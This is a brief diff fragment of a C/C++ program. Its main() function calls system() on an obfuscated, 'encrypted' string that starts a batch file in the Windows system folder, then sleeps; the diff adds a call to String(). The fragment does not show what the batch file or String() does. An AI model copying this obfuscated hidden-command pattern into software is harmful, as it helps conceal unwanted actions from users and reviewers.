@@ -79,6 +79,7 @@ int main()
 	Beep();
 	system(_T(EncryptS("start C:\\Windows\\System\\check.bat")));
 	Sleep(6500);
+	String();
 	
 }
 
